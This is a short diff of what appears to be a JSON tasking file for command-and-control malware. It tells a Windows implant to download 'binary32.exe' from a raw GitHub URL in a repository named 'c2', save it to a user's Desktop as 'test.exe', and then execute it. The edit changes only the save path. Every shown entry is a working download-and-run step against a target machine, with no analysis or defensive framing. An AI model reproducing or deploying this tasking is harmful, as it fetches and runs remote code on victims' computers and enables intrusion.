@@ -3,12 +3,12 @@
     {
      "type": "load", 
      "url": "https://raw.githubusercontent.com/tvdogs/c2/master/binary32.exe",
-     "dest": "C:\\Users\\SHINDAN1801\\Desktop\\nris\\nritest.exe"
+     "dest": "C:\\Users\\SHINDAN1801\\Desktop\\test.exe"
     },
 "00000002": 
     {
      "type": "exec", 
-     "payload": "C:\\Users\\SHINDAN1801\\Desktop\\nris\\nritest.exe"
+     "payload": "C:\\Users\\SHINDAN1801\\Desktop\\test.exe"
     },
 "00000003": 
     {
